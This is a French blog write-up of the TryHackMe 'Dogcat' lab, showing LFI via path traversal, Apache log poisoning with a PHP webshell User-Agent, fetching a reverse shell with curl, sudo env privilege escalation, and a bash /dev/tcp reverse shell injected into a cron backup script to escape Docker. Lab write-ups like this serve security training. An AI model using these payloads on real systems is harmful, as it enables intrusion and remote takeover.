<!DOCTYPE html>
<html lang="en">
  <head>
    
      <title>
        üìô Dogcat ::
        blog cybers√©curit√©
      </title>
    
    <meta http-equiv="content-type" content="text/html; charset=utf-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<meta
  name="description"
  content="Recon Foothold Privilege Escalation Docker Escape dogcat.thm # Difficulty: Medium OS: Linux Description: I made a website where you can look at pictures of dogs and/or cats! Exploit a PHP application via LFI and break out of a docker container. Link: https://tryhackme.com/room/dogcat Note # La room est pas mal, la partie privesc est beaucoup plus facile que le foothold qui m‚Äôa bien fait gal√©rer puisque je faisais n‚Äôimporte quoi, et √† l‚Äôinverse pour la docker escape, on doit vraiment chercher pour trouver le script backup."
/>
<meta
  name="keywords"
  content="rami malek"
/>
<meta name="robots" content="noodp" />
<link rel="canonical" href="/thm-writeups/dogcat/" />


<meta name="description" content="un blog sur lequel vous pourrez retrouver des writeups et des posts explicatifs en fran√ßais et en anglais">




<link rel="stylesheet" href="/css/style.css" />

<link rel="stylesheet" href="/style.css" />


<link rel="apple-touch-icon-precomposed" sizes="144x144" href="/img/apple-touch-icon-144-precomposed.png" />
<link rel="shortcut icon" href="/img/favicon.png" />


<link href="/fonts/Inter-Italic.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
<link href="/fonts/Inter-Regular.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
<link href="/fonts/Inter-Medium.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
<link href="/fonts/Inter-MediumItalic.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
<link href="/fonts/Inter-Bold.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
<link href="/fonts/Inter-BoldItalic.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">


<meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="üìô Dogcat"/>
<meta name="twitter:description" content="Local File Inclusion - Log Poisonning - Docker Escape"/>



<meta property="og:title" content="üìô Dogcat" />
<meta property="og:description" content="Local File Inclusion - Log Poisonning - Docker Escape" />
<meta property="og:type" content="article" />
<meta property="og:url" content="/thm-writeups/dogcat/" /><meta property="article:section" content="thm-writeups" />
<meta property="article:published_time" content="2022-12-24T00:00:00+00:00" />
<meta property="article:modified_time" content="2022-12-24T00:00:00+00:00" /><meta property="og:site_name" content="blog cybers√©curit√©" />







  </head>
  <body class="dark-theme">
    <div class="container">
      <header class="header">
  <span class="header__inner">
    <a
  href="/"
  class="logo"
  style="text-decoration: none;"
>
  
    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44">
  <path fill="none" d="M15 8l14.729 14.382L15 35.367" />
</svg>
</span>
    <span class="logo__text"
      >c0nfl1c7</span
    >
    <span class="logo__cursor"></span>
  
</a>

    <span class="header__right">
      
        <nav class="menu">
  <ul class="menu__inner menu__inner--desktop">
    
      
        
          <li><a href="/about">About</a></li>
        
      
        
          <li><a href="/archive">Archive</a></li>
        
      
      
        <ul class="menu__sub-inner">
          <li class="menu__sub-inner-more-trigger">
            writeups
            <span class="menu__sub-inner-more-trigger-icon"
              ><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44">
  <path fill="none" d="M15 8l14.729 14.382L15 35.367" />
</svg>
</span
            >
          </li>
          <ul class="menu__sub-inner-more hidden">
            
              
                <li><a href="/htb-writeups/">HTB Writeups</a></li>
              
            
              
                <li><a href="/thm-writeups/">THM Writeups</a></li>
              
            
          </ul>
        </ul>
      
      
  </ul>

  <ul class="menu__inner menu__inner--mobile">
    
      
        <li><a href="/about">About</a></li>
      
    
      
        <li><a href="/archive">Archive</a></li>
      
    
      
        <li><a href="/htb-writeups/">HTB Writeups</a></li>
      
    
      
        <li><a href="/thm-writeups/">THM Writeups</a></li>
      
    
  </ul>
</nav>

        <span class="menu-trigger">
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
            <path d="M0 0h24v24H0z" fill="none" />
            <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z" />
          </svg>
        </span>
      
      <span class="theme-toggle">
        <svg
  class="theme-toggler"
  width="24"
  height="24"
  viewBox="0 0 48 48"
  fill="none"
  xmlns="http://www.w3.org/2000/svg"
>
  <path
    d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
  3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"
  />
</svg>

      </span>
    </span>
  </span>
</header>


      <div class="content">
        
  
  

  <article class="post">
    <h1 class="post-title">üìô Dogcat</h1>
    <div class="post-meta">
      
        <time class="post-date">
          24-12-2022
        </time>

        
      

      
        <span class="post-author"
          >‚Äî √©crit par conflict</span
        >


      
        <span class="post-read-time"
          >‚Äî 5 minute(s) de lecture</span
        >
      
    </div>

    

    

    <div class="post-content">
      
      <hr>
<ul>
<li><a href="#recon">Recon</a></li>
<li><a href="#foothold">Foothold</a></li>
<li><a href="#privilege-escalation">Privilege Escalation</a></li>
<li><a href="#docker-escape">Docker Escape</a></li>
</ul>
<hr>
<h1 id="dogcatthm">
  dogcat.thm
  <a href="#dogcatthm" class="h-anchor" aria-hidden="true">#</a>
</h1>
<ul>
<li>Difficulty: Medium</li>
<li>OS: Linux</li>
<li>Description: <code>I made a website where you can look at pictures of dogs and/or cats! Exploit a PHP application via LFI and break out of a docker container.</code></li>
<li>Link: <a href="https://tryhackme.com/room/dogcat">https://tryhackme.com/room/dogcat</a></li>
</ul>
<h1 id="note">
  Note
  <a href="#note" class="h-anchor" aria-hidden="true">#</a>
</h1>
<p>La room est pas mal, la partie privesc est beaucoup plus facile que le foothold qui m‚Äôa bien fait gal√©rer puisque je faisais n‚Äôimporte quoi, et √† l‚Äôinverse pour la docker escape, on doit vraiment chercher pour trouver le script backup.sh‚Ä¶</p>
<h1 id="recon">
  Recon
  <a href="#recon" class="h-anchor" aria-hidden="true">#</a>
</h1>
<p>On lance:</p>
<p><code>‚å®Ô∏è nmap -A dogcat.thm</code></p>
<p><img src="https://user-images.githubusercontent.com/77807503/207948122-aec6bdc1-cb0c-4fbe-b137-bee1a341243d.png" alt="2022-12-15-183118_828x228_scrot"></p>
<p>Rien de vraiment int√©ressant ici</p>
<p><code>‚å®Ô∏è dirb http://dogcat.thm</code></p>
<p><img src="https://user-images.githubusercontent.com/77807503/207948161-c276e45d-453c-468a-bafd-3cf287db8aad.png" alt="2022-12-15-184415_930x1026_scrot"></p>
<p>eeeeeeet, rien de vraiment int√©ressant ici non pus</p>
<h1 id="foothold">
  Foothold
  <a href="#foothold" class="h-anchor" aria-hidden="true">#</a>
</h1>
<p>On va donc se concentrer sur le site en lui m√™me:</p>
<p><img src="https://user-images.githubusercontent.com/77807503/207948180-ba53a656-3fb1-4d6d-91ab-9934d7928771.png" alt="2022-12-15-182558_400x276_scrot"></p>
<p>Deux boutons, si on clique sur le bouton <strong><strong><strong>cat</strong></strong></strong> par exemple, on est redirig√© vers <strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong>dogcat.thm/?view=cat</strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></p>
<p>On voit la LFI venir de loin, on tente donc de modifier le param√®tre view pour y mettre cat.php</p>
<p><img src="https://user-images.githubusercontent.com/77807503/207948207-65d07392-fab7-45fc-8704-faf35f70668a.png" alt="2022-12-15-183301_914x454_scrot"></p>
<p>Ceci cr√©e une erreur mais nous confirme que le site est bien vuln√©rable √† une LFI sur ce param√®tre</p>
<p>Cela nous indique aussi qu‚Äôil ajoute l‚Äôextention .php √† la fin du param√®tre, ce qui ne nous arrange pas</p>
<p>Puisqu‚Äôon ne peut lire que des fichiers PHP (√† cause de l‚Äôextention), on peut tenter de lire l‚Äôindex:</p>
<p><code>‚å®Ô∏è ?view=php://filter/convert.base64-encode/resource=cat/../index</code></p>
<p>On utilise le filtre base64 pour lire le fichier index.php (on ne pr√©cise pas le .php puisque le backend va le rajouter tout seul)</p>
<p><img src="https://user-images.githubusercontent.com/77807503/207948338-68202432-02af-4e33-93e0-80daeaadfb78.png" alt="2022-12-15-183822_1035x369_scrot"></p>
<p>Et le site nous retourne bel et bien le code de l‚Äôindex en base64</p>
<p>En le d√©codant, on a ceci:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;!</span><span style="color:#a6e22e">DOCTYPE</span> <span style="color:#a6e22e">HTML</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;</span><span style="color:#a6e22e">html</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;</span><span style="color:#a6e22e">head</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;</span><span style="color:#a6e22e">title</span><span style="color:#f92672">&gt;</span><span style="color:#a6e22e">dogcat</span><span style="color:#f92672">&lt;/</span><span style="color:#a6e22e">title</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;</span><span style="color:#a6e22e">link</span> <span style="color:#a6e22e">rel</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;stylesheet&#34;</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text/css&#34;</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/style.css&#34;</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;/</span><span style="color:#a6e22e">head</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;</span><span style="color:#a6e22e">body</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;</span><span style="color:#a6e22e">h1</span><span style="color:#f92672">&gt;</span><span style="color:#a6e22e">dogcat</span><span style="color:#f92672">&lt;/</span><span style="color:#a6e22e">h1</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;</span><span style="color:#a6e22e">i</span><span style="color:#f92672">&gt;</span><span style="color:#a6e22e">a</span> <span style="color:#a6e22e">gallery</span> <span style="color:#a6e22e">of</span> <span style="color:#a6e22e">various</span> <span style="color:#a6e22e">dogs</span> <span style="color:#66d9ef">or</span> <span style="color:#a6e22e">cats</span><span style="color:#f92672">&lt;/</span><span style="color:#a6e22e">i</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;</span><span style="color:#a6e22e">div</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;</span><span style="color:#a6e22e">h2</span><span style="color:#f92672">&gt;</span><span style="color:#a6e22e">What</span> <span style="color:#a6e22e">would</span> <span style="color:#a6e22e">you</span> <span style="color:#a6e22e">like</span> <span style="color:#a6e22e">to</span> <span style="color:#a6e22e">see</span><span style="color:#f92672">?&lt;/</span><span style="color:#a6e22e">h2</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;</span><span style="color:#a6e22e">a</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/?view=dog&#34;</span><span style="color:#f92672">&gt;&lt;</span><span style="color:#a6e22e">button</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;dog&#34;</span><span style="color:#f92672">&gt;</span><span style="color:#a6e22e">A</span> <span style="color:#a6e22e">dog</span><span style="color:#f92672">&lt;/</span><span style="color:#a6e22e">button</span><span style="color:#f92672">&gt;&lt;/</span><span style="color:#a6e22e">a</span><span style="color:#f92672">&gt;</span> <span style="color:#f92672">&lt;</span><span style="color:#a6e22e">a</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/?view=cat&#34;</span><span style="color:#f92672">&gt;&lt;</span><span style="color:#a6e22e">button</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;cat&#34;</span><span style="color:#f92672">&gt;</span><span style="color:#a6e22e">A</span> <span style="color:#a6e22e">cat</span><span style="color:#f92672">&lt;/</span><span style="color:#a6e22e">button</span><span style="color:#f92672">&gt;&lt;/</span><span style="color:#a6e22e">a</span><span style="color:#f92672">&gt;&lt;</span><span style="color:#a6e22e">br</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">containsStr</span>($str, $substr) {
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">strpos</span>($str, $substr) <span style="color:#f92672">!==</span> <span style="color:#66d9ef">false</span>;
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>	    $ext <span style="color:#f92672">=</span> <span style="color:#a6e22e">isset</span>($_GET[<span style="color:#e6db74">&#34;ext&#34;</span>]) <span style="color:#f92672">?</span> $_GET[<span style="color:#e6db74">&#34;ext&#34;</span>] <span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;.php&#39;</span>;
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">isset</span>($_GET[<span style="color:#e6db74">&#39;view&#39;</span>])) {
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">containsStr</span>($_GET[<span style="color:#e6db74">&#39;view&#39;</span>], <span style="color:#e6db74">&#39;dog&#39;</span>) <span style="color:#f92672">||</span> <span style="color:#a6e22e">containsStr</span>($_GET[<span style="color:#e6db74">&#39;view&#39;</span>], <span style="color:#e6db74">&#39;cat&#39;</span>)) {
</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#39;Here you go!&#39;</span>;
</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">include</span> $_GET[<span style="color:#e6db74">&#39;view&#39;</span>] <span style="color:#f92672">.</span> $ext;
</span></span><span style="display:flex;"><span>                } <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#39;Sorry, only dogs or cats are allowed.&#39;</span>;
</span></span><span style="display:flex;"><span>                }
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>        <span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    &lt;/div&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">&lt;/body&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">&lt;/html&gt;
</span></span></span></code></pre></div><p>Et on peut voir quelque chose de tr√®s int√©ressant:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span>$ext <span style="color:#f92672">=</span> <span style="color:#a6e22e">isset</span>($_GET[<span style="color:#e6db74">&#34;ext&#34;</span>]) <span style="color:#f92672">?</span> $_GET[<span style="color:#e6db74">&#34;ext&#34;</span>] <span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;.php&#39;</span>;
</span></span></code></pre></div><p>Cette condition est la cause de l‚Äôajout du <strong><strong><strong><strong>.php</strong></strong></strong></strong> √† la fin du nom du fichier</p>
<p>En mettent un param√®tre GET <strong><strong><strong>ext</strong></strong></strong>, on peut l‚Äôemp√™cher de faire ceci</p>
<p>On peux donc craft un nouveau payload</p>
<p><code>‚å®Ô∏è ?view=cat/../../../../../../../../etc/passwd&amp;ext=</code></p>
<p>En faisant √ßa, on va lire le /etc/passwd et puisque le param√®tre <strong><strong><strong>ext</strong></strong></strong> existe, mais qu‚Äôil est vide, le site n‚Äôajoutera pas d‚Äôextention au fichier</p>
<p>Maintenant qu‚Äôon a un arbitrary file read, il faut le transformer en RCE</p>
<p>La premi√®re m√©thode qu‚Äôon peut tester est le log poisonning</p>
<p>Cela consiste √† injecter du code php d‚Äôune mani√®re ou d‚Äôune autre dans les logs du serveur, puis de lire les logs via notre LFI pour que le code qu‚Äôon y a inject√© soit √©xecut√©</p>
<p>On j√®te un coup d‚Äôoeil rapide √† la requ√™te et on voit que le site utilise apache puisqu‚Äôil y a <strong>Server Apache/2.4.38 (Debian)</strong> dans les headers</p>
<p>On va donc lire les logs:</p>
<p><code>‚å®Ô∏è ?view=cat/../../../../../../../../var/log/apache2/access.log&amp;ext=</code></p>
<p><img src="https://user-images.githubusercontent.com/77807503/207948498-5044cd35-79b1-45ed-8cca-304209026729.png" alt="2022-12-15-184704_928x560_scrot"></p>
<p>Et c‚Äôest parfait, on voit que le site log non seulement notre IP, mais aussi notre User-Agent</p>
<p><img src="https://user-images.githubusercontent.com/77807503/207948524-44806d26-73a4-4dd7-924d-a272da5909e9.png" alt="2022-12-15-185117_828x82_scrot"></p>
<p>En mettant <strong><strong><strong><strong><strong><strong>du PHP</strong></strong></strong></strong></strong></strong> dans notre <strong><strong><strong><strong><strong><strong><strong><strong><strong><strong>User-Agent</strong></strong></strong></strong></strong></strong></strong></strong></strong></strong>, on devrait donc avoir une RCE</p>
<p>On va tester avec cet <strong><strong>UA</strong></strong>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span> <span style="color:#a6e22e">system</span>(<span style="color:#e6db74">&#34;ls&#34;</span>) <span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
</span></span></span></code></pre></div><p><img src="https://user-images.githubusercontent.com/77807503/207948542-c6c2ded3-072e-41ac-aa29-a699e0a273fd.png" alt="2022-12-15-185257_885x388_scrot"></p>
<p>eeeet‚Ä¶ j‚Äôai cass√© les logs</p>
<p>Puisque j‚Äôai fait une erreur dans mon PHP (j‚Äôai oubli√© le ; √† la fin), j‚Äôai cass√© le fichier logs et il est maintenant illisible √† tout jamais ü•≤</p>
<p>Ma seule option est donc de red√©marrer la box, et de r√©essayer</p>
<p>Cette fois, je tente avec cet <strong><strong><strong>UA</strong></strong></strong>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span> <span style="color:#a6e22e">system</span>(<span style="color:#e6db74">&#39;ls&#39;</span>); <span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
</span></span></span></code></pre></div><p><img src="https://user-images.githubusercontent.com/77807503/207948594-d712c15b-32ff-488e-80ad-03ce6875d294.png" alt="2022-12-15-185855_952x513_scrot"></p>
<p>Ca fonctionne, on peut voir qu‚Äôil a bien √©x√©cut√© le <strong><strong><strong>PHP</strong></strong></strong></p>
<p>Apr√®s avoir test√© beaucoup de chose et avoir bien gal√©r√©, je passe sur un syst√®me un peu plus ‚Äú<strong><strong><strong><strong><strong><strong><strong><strong><strong><strong>webshell</strong></strong></strong></strong></strong></strong></strong></strong></strong></strong>‚Äù, je modifie mon <strong><strong><strong><strong><strong><strong><strong><strong><strong><strong>user-agent</strong></strong></strong></strong></strong></strong></strong></strong></strong></strong> en:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span> <span style="color:#a6e22e">system</span>($_GET[<span style="color:#e6db74">&#34;cmd&#34;</span>]);<span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
</span></span></span></code></pre></div><p>Je peux donc √©xecuter du php avec un param√®tre de ma requ√™te maintenant</p>
<p>Aucun des reverse shell exec que j‚Äôai essay√© n‚Äôa fonctionn√©, je vais donc get un fichier php depuis ma machine, puis le lire</p>
<p>Je cr√©e un <strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong>reverse.php</strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong> sur ma machine, et je lance un serveur python dans le m√™me dossier</p>
<p>Notre payload ressemble donc √†</p>
<p><code>‚å®Ô∏è ?view=cat/../../../../../../../../var/log/apache2/access.log&amp;ext=&amp;cmd=curl 10.xx.xx.xx/reverse.php -o reverse.php</code></p>
<p><img src="https://user-images.githubusercontent.com/77807503/207948634-8f3eece0-f064-46c7-aa4b-20ee39ef627a.png" alt="2022-12-15-192041_768x670_scrot"></p>
<p>Je re√ßois plein de requ√™tes mais c‚Äôest normal puisqu‚Äôen faisant √ßa on cr√©e aussi une boucle infinie</p>
<p>Ce n‚Äôest pas un probl√®me puisque le site va quand m√™me get notre reverse shell, on n‚Äôa plus qu‚Äô√† lancer un netcat, et se rendre sur <strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong>/reverse.php</strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></p>
<p><code>‚å®Ô∏è nc -lvnp 9001</code></p>
<p><img src="https://user-images.githubusercontent.com/77807503/207948655-12505c8c-8497-4db2-bd8e-247785b28fa5.png" alt="2022-12-15-192700_984x239_scrot"></p>
<p>On se balade un peu pour trouver les flags, a priori il y en a deux</p>
<p><img src="https://user-images.githubusercontent.com/77807503/207948686-1515ba08-c982-45b9-8486-7d07670293f7.png" alt="2022-12-15-192813_501x581_scrot"></p>
<p>(j‚Äôai trouv√© le 2√®me avant le premier mais pas grave)</p>
<p><code>THM{LF1_[...]_aec3fb}</code></p>
<p><code>THM{Th1s_1s_[...]_ab67edfa}</code></p>
<h1 id="privilege-escalation">
  Privilege Escalation
  <a href="#privilege-escalation" class="h-anchor" aria-hidden="true">#</a>
</h1>
<p><code>‚å®Ô∏è sudo -l</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#a6e22e">Matching</span> <span style="color:#a6e22e">Defaults</span> <span style="color:#a6e22e">entries</span> <span style="color:#66d9ef">for</span> <span style="color:#a6e22e">www</span><span style="color:#f92672">-</span><span style="color:#a6e22e">data</span> <span style="color:#a6e22e">on</span> <span style="color:#ae81ff">3732</span><span style="color:#a6e22e">cff32a70</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">env_reset</span>, <span style="color:#a6e22e">mail_badpass</span>, <span style="color:#a6e22e">secure_path</span><span style="color:#f92672">=/</span><span style="color:#a6e22e">usr</span><span style="color:#f92672">/</span><span style="color:#a6e22e">local</span><span style="color:#f92672">/</span><span style="color:#a6e22e">sbin\</span><span style="color:#f92672">:/</span><span style="color:#a6e22e">usr</span><span style="color:#f92672">/</span><span style="color:#a6e22e">local</span><span style="color:#f92672">/</span><span style="color:#a6e22e">bin\</span><span style="color:#f92672">:/</span><span style="color:#a6e22e">usr</span><span style="color:#f92672">/</span><span style="color:#a6e22e">sbin\</span><span style="color:#f92672">:/</span><span style="color:#a6e22e">usr</span><span style="color:#f92672">/</span><span style="color:#a6e22e">bin\</span><span style="color:#f92672">:/</span><span style="color:#a6e22e">sbin\</span><span style="color:#f92672">:/</span><span style="color:#a6e22e">bin</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">User</span> <span style="color:#a6e22e">www</span><span style="color:#f92672">-</span><span style="color:#a6e22e">data</span> <span style="color:#a6e22e">may</span> <span style="color:#a6e22e">run</span> <span style="color:#a6e22e">the</span> <span style="color:#a6e22e">following</span> <span style="color:#a6e22e">commands</span> <span style="color:#a6e22e">on</span> <span style="color:#ae81ff">3732</span><span style="color:#a6e22e">cff32a70</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>    (<span style="color:#a6e22e">root</span>) <span style="color:#a6e22e">NOPASSWD</span><span style="color:#f92672">:</span> <span style="color:#f92672">/</span><span style="color:#a6e22e">usr</span><span style="color:#f92672">/</span><span style="color:#a6e22e">bin</span><span style="color:#f92672">/</span><span style="color:#a6e22e">env</span>
</span></span></code></pre></div><p>On a la perm <strong><strong><strong><strong>sudo</strong></strong></strong></strong> sur <strong><strong><strong>/usr/bin/env</strong></strong></strong></p>
<p>‚Üí <a href="https://gtfobins.github.io/gtfobins/env/#sudo">GTFObins</a></p>
<p><code>‚å®Ô∏è sudo env /bin/sh</code></p>
<p>On cat le 3e flag</p>
<p><img src="https://user-images.githubusercontent.com/77807503/207948716-22e25421-2d17-49b4-b74a-4cdce14c9028.png" alt="2022-12-15-193011_1073x443_scrot"></p>
<p><code>THM{D1ff3r3nt_[...]_874112}</code></p>
<p>sauf qu‚Äôil y en a 4‚Ä¶ ü•≤</p>
<h1 id="docker-escape">
  Docker Escape
  <a href="#docker-escape" class="h-anchor" aria-hidden="true">#</a>
</h1>
<p>En regardant attentivement le r√©sultat du <strong><strong><strong><strong><strong><strong><strong>sudo -l</strong></strong></strong></strong></strong></strong></strong>, on voit ceci:</p>
<blockquote>
<p>User www-data may run the following commands on 3732cff32a70</p>
</blockquote>
<p>Le nom de l‚Äôhost indique qu‚Äôon est dans un docker</p>
<p>En se balandant sur la machine, on trouve <strong><strong><strong><strong><strong><strong><strong><strong><strong>backup.sh</strong></strong></strong></strong></strong></strong></strong></strong></strong> dans <strong><strong><strong><strong><strong>/opt/</strong></strong></strong></strong></strong></p>
<p>Un script de <strong><strong><strong><strong><strong><strong>backup</strong></strong></strong></strong></strong></strong> dans un <strong><strong><strong><strong><strong><strong>docker</strong></strong></strong></strong></strong></strong>, g√©n√©ralement, y‚Äôa un cron derri√®re qui le run toutes les X secondes</p>
<p>Et puisqu‚Äôon est root, on peut tout b√™tement ajouter ce qu‚Äôon veut dedans</p>
<p>Donc on ajoute un payload de reverse shell et on lance un netcat sur notre machine</p>
<p><code>‚å®Ô∏è echo &quot;bash -i &gt;&amp; /dev/tcp/10.8.47.144/1338 0&gt;&amp;1&quot; &gt;&gt; backup.sh</code></p>
<p>J‚Äôai m√™me pas le temps de prendre un screen que le netcat re√ßoit la connection</p>
<p>On est maintenant root sur la machine principale, et on peut r√©cup√©rer le dernier flag</p>
<p><img src="https://user-images.githubusercontent.com/77807503/207948760-81200cc9-4369-4bf5-bfb1-b159424ffb6c.png" alt="2022-12-15-193605_1920x1080_scrot"></p>
<h6 id="back-to-top">
  <a href="#"><em>back to top</em></a>
  <a href="#back-to-top" class="h-anchor" aria-hidden="true">#</a>
</h6>

    </div>
    

    
      
    
  </article>

      </div>

      
        <footer class="footer">
  <div class="footer__inner">
    
      <div class="copyright copyright--user">rami malek en personne</div>
      
  </div>
</footer>





<script type="text/javascript" src="/bundle.min.js"></script>


      
    </div>

    
  </body>
</html>
